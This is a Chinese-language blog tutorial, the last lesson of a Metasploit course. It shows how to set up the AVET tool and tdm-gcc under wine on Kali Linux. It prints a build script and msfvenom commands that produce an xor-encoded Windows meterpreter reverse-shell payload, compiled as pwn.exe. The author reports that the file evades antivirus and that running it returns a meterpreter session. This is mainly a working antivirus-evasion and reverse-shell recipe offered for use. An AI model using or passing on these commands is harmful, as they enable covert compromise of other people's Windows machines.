---
title: Metasploit系列课程第八课
date: 2017-07-02 19:35:44
tags: Metasploit
categories: Metasploit
---
![enter description here][1]
<!--more-->
## 0x00
Metasploit系列课程第八课 最后的最后一课。这次和以往不同，最后一课不打算用视频，想用文章的形式给各位体现，说实在的个人的时间实在不太充裕，也是最近抽空给各位写下这篇文章。。。
&nbsp;
Metasploit 系列教程  => 链接:https://pan.baidu.com/s/1dFzPkJZ 密码:evwg 
 周年庆版 V1.6 github =>https://github.com/demonsec666/secist_script
## 0x01
Metasploit系列课程第八课这次使用到的工具呢是(AVET)

1.下载地址 :  https://github.com/govolution/avet (其中的几篇pdf 文章不错)
&nbsp;
![enter description here][2]
&nbsp;
2.在kali中使用这款工具呢。作者提示我们需要安装一样编译器是（tdm-gcc）（作者提供我的，不知道为什么装不上，所以我从官网上下载了，各位也可以使用我提供的）
http://tdm-gcc.tdragon.net/download   链接:https://pan.baidu.com/s/1dFzPkJZ 密码:evwg 
&nbsp;
![enter description here][3]
&nbsp;
3.我们下载完后，将开始使用wine 在kali上安装tdm-gcc（在kali中会有中文乱码，可以跟着我图中步骤走，左图为我mac ，右图为kali 使用wine的情况，因时间关系我未去解决编码的问题，先凑合着看）
&nbsp;
![enter description here][4]
&nbsp;
![enter description here][5]
&nbsp;
![enter description here][6]
&nbsp;
![enter description here][7]
&nbsp;
![enter description here][8]
&nbsp;
![enter description here][9]
&nbsp;
![enter description here][10]
&nbsp;
正在安装
![enter description here][11]
&nbsp;
安装完毕
![enter description here][12]
&nbsp;
![enter description here][13]
&nbsp;
&nbsp;
## 0x02
 1. 我们看下大致的目录情况
&nbsp;
![enter description here][14]
&nbsp;
![enter description here][15]
&nbsp;
 2.使用方法根据作者提示给我们的是这样的
&nbsp;
![enter description here][16]
&nbsp;
<pre>root@kalidan:~/tools/avet# ./build/build_win32_meterpreter_rev_https_20xshikata.sh</pre>
那么我们可以看到他这边调用的是build的目录下的 build_win32_meterpreter_rev_https_20xshikata.sh,使用shell脚本
我们大致的看下这个脚本的代码：
<pre>
#build_win64_meterpreter_rev_tcp_xor
环境变量定义
. avet/build/global_win64.sh
# make meterpreter reverse payload
#制作msf reverse payload
msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=xxxxx  lport=xxx -e x64/xor -f c --platform Windows > avet/sc.txt
#make_avet 格式化 这个 shellcode
./avet/format.sh avet/sc.txt > avet/scclean.txt && rm avet/sc.txt
#调用 make_avet, compile
./avet/make_avet -f avet/scclean.txt -X -E
$win64_compiler -o output/pwn.exe avet.c
输出pwn.exe 
# cleanup
rm avet/scclean.txt && echo "" > avet/defs.h
</pre>
&nbsp;
![enter description here][17]
&nbsp;
3. 使用制作payload执行的过程

&nbsp;
![enter description here][18]
&nbsp;
![enter description here][19]
&nbsp;
4.其中只要我们修改的代码呢其实就是msfvenom那段代码 将LHOST 和LPORT 改成自己想要的就可以了
<pre>msfvenom -p windows/meterpreter/reverse_https lhost=192.168.116.128 lport=443 -e x86</pre>
那么我们重新生成一次，并手动的开启MSF 。
&nbsp;
![enter description here][20]
&nbsp;
在运行之前我们可以对pwn.exe检测一次是否能绕过AV
&nbsp;
![enter description here][21]
&nbsp;
效果还算是理想
&nbsp;
![enter description here][22]
&nbsp;
运行 制作成的pwn.exe后 得到meterpreter.
![enter description here][23]
&nbsp;
![enter description here][24]
&nbsp;
那么shell脚本下 可以这么写
![enter description here][25]
&nbsp;
项目已经上传在GitHub项目中了
最后的彩蛋 我使用ruby 做的GUI=> GTK 
## 视频演示：
<div style="width:640px;height:480px;margin:0 auto;" id="ivaLive"></div>
<script type="text/javascript" src="http://7xjfim.com2.z0.glb.qiniucdn.com/Iva.js"></script>
<script>
    var ivaInstance = new Iva('ivaLive', {
        appkey: 'By9WGzBIx', //应用标示
        video: 'http://demonsec666.oss-cn-qingdao.aliyuncs.com/secist_GUI.mp4', //视频
        title: 'test', //视频标题，后台视频管理中的标题
        cover: '' //视频封面，只有在autoplay:false才可生效
    });
</script>
<script src="//cytroncdn.videojj.com/latest/Iva.js"></script>

  [1]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/1498995788979.jpg
  [2]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/1498995978528.jpg
  [3]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/1498996174820.jpg
  [4]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/1498997269209.jpg
  [5]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/1498996586904.jpg
  [6]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/1498996688455.jpg
  [7]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/1498996753536.jpg
  [8]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/1498996825354.jpg
  [9]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/1498996885631.jpg
  [10]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/1498996998833.jpg
  [11]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/1498997015884.jpg
  [12]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/1498997099344.jpg
  [13]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/1498997137286.jpg
  [14]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/1498997475884.jpg
  [15]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/1498997487062.jpg
  [16]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/1498997239538.jpg
  [17]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/1498998133097.jpg
  [18]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/1498998245364.jpg
  [19]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/1498998316743.jpg
  [20]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/1499000792945.jpg
  [21]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/1498999379841.jpg
  [22]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/1499000080489.jpg
  [23]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/1499001086561.jpg
  [24]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/1499001129527.jpg
  [25]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/1499002903000.jpg